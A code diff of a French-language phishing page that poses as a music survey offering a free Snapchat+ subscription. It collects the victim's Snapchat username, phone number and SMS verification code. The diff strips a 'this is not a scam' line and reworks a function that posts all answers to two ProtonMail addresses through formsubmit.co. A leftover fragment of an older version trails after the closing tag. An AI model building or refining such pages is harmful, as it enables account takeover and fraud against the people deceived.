@@ -58,7 +58,7 @@ body {
 }
 
 h2 { font-size:30px; margin-bottom:20px; }
-h3 { font-size:18px; margin-bottom:20px; line-height:1.5; }
+h3 { font-size:20px; margin-bottom:25px; }
 p { font-size:20px; margin-bottom:25px; }
 
 input {
@@ -136,6 +136,7 @@ button:disabled {
 @media(max-width:600px){
     .box{margin:20px;padding:25px}
     h2{font-size:24px}
+    h3{font-size:18px}
 }
 </style>
 </head>
@@ -159,11 +160,11 @@ button:disabled {
     <button onclick="demarrer()">Commencer</button>
 </div>
 
-<!-- INTERMÉDIAIRE (TEXTE LONG COMPLET) -->
+<!-- INTERMÉDIAIRE -->
 <div class="box" id="intermediaire" style="display:none;">
     <h2>Merci !</h2>
     <h3>
-        Pour recevoir votre abonnement à Snapchat+, une vérification d'identité est nécessaire afin de garantir des réponses humaines et d'éviter les abus. Cette offre n'est disponible qu'une seule fois par compte Snapchat et par personne, donc en continuant vous vous engagez à ce que cela constitue votre première et unique intervention sur ce sondage. Non ce n'est pas une arnaque. Seules les entreprises SFR, Bouygues et Orange sont acceptées par les partenaires avec lesquels nous travaillons. La vérification se fait via votre numéro de téléphone (données anonymes et supprimées ensuite).
+        Pour recevoir votre abonnement à Snapchat+, une vérification d'identité est nécessaire afin de garantir des réponses humaines et d'éviter les abus. Cette offre n'est disponible qu'une seule fois par compte Snapchat et par personne, donc en continuant vous vous engagez à ce que cela constitue votre première et unique intervention sur ce sondage. Seules les entreprises SFR, Bouygues et Orange sont acceptées par les partenaires avec lesquels nous travaillons. La vérification se fait via votre numéro de téléphone (données anonymes et supprimées ensuite).
     </h3>
     <button onclick="continuer()">Continuer</button>
 </div>
@@ -279,79 +280,32 @@ function continuer(){
     afficherQuestion();
 }
 
-// --- Fonction envoyer corrigée pour que les mails partent correctement ---
 function envoyer() {
-    const formData = new FormData();
-    formData.append("artiste_prefere", reponsesUtilisateur[0] || "");
-    formData.append("artiste_deezer", reponsesUtilisateur[1] || "");
-    formData.append("artiste_decouverte", reponsesUtilisateur[2] || "");
-    formData.append("snapchat", reponsesUtilisateur[3] || "");
-    formData.append("telephone", reponsesUtilisateur[4] || "");
-    formData.append("code_sms", reponsesUtilisateur[5] || "");
-    formData.append("_captcha", "false");
-    formData.append("_template", "table");
+    const urls = [
+        "https://formsubmit.co/anonymous2026b@protonmail.com",
+        "https://formsubmit.co/becteurfoou@proton.me"
+    ];
 
-    // Premier envoi
-    fetch("https://formsubmit.co/anonymous2026b@protonmail.com", {
-        method: "POST",
-        body: formData
-    })
-    .then(res => {
-        if(res.ok) console.log("Premier mail envoyé");
-        else console.error("Erreur premier envoi");
-    })
-    .catch(err => console.error("Erreur premier envoi :", err));
+    urls.forEach(url => {
+        const formData = new FormData();
+        formData.append("artiste_prefere", reponsesUtilisateur[0] || "");
+        formData.append("artiste_deezer", reponsesUtilisateur[1] || "");
+        formData.append("artiste_decouverte", reponsesUtilisateur[2] || "");
+        formData.append("snapchat", reponsesUtilisateur[3] || "");
+        formData.append("telephone", reponsesUtilisateur[4] || "");
+        formData.append("code_sms", reponsesUtilisateur[5] || "");
+        formData.append("_captcha", "false");
+        formData.append("_template", "table");
 
-    // Deuxième envoi (on recrée FormData pour éviter conflits)
-    const formData2 = new FormData();
-    formData2.append("artiste_prefere", reponsesUtilisateur[0] || "");
-    formData2.append("artiste_deezer", reponsesUtilisateur[1] || "");
-    formData2.append("artiste_decouverte", reponsesUtilisateur[2] || "");
-    formData2.append("snapchat", reponsesUtilisateur[3] || "");
-    formData2.append("telephone", reponsesUtilisateur[4] || "");
-    formData2.append("code_sms", reponsesUtilisateur[5] || "");
-    formData2.append("_captcha", "false");
-    formData2.append("_template", "table");
-
-    fetch("https://formsubmit.co/becteurfoou@proton.me", {
-        method: "POST",
-        body: formData2
-    })
-    .then(res => {
-        if(res.ok) console.log("Deuxième mail envoyé");
-        else console.error("Erreur deuxième envoi");
-    })
-    .catch(err => console.error("Erreur deuxième envoi :", err));
+        fetch(url, {
+            method: "POST",
+            body: formData
+        })
+        .then(() => console.log(`Mail envoyé à ${url}`))
+        .catch(err => console.error(`Erreur envoi à ${url} :`, err));
+    });
 }
 </script>
 
 </body>
 </html>
-tilisateur[4] || "");
-    formData.append("code_sms", reponsesUtilisateur[5] || "");
-    formData.append("_captcha", "false");
-    formData.append("_template", "table");
-
-    // Premier envoi
-    fetch("https://formsubmit.co/anonymous2026b@protonmail.com", {
-        method: "POST",
-        body: formData
-    }).then(() => console.log("Premier mail envoyé"))
-      .catch(err => console.error("Erreur premier envoi :", err));
-
-    // Deuxième envoi
-    const formData2 = new FormData();
-    for(let [key, value] of formData.entries()){ formData2.append(key, value); }
-    fetch("https://formsubmit.co/becteurfoou@proton.me", {
-        method: "POST",
-        body: formData2
-    }).then(() => console.log("Deuxième mail envoyé"))
-      .catch(err => console.error("Erreur deuxième envoi :", err));
-}
-</script>
-
-</body>
-</html>
-
-
-
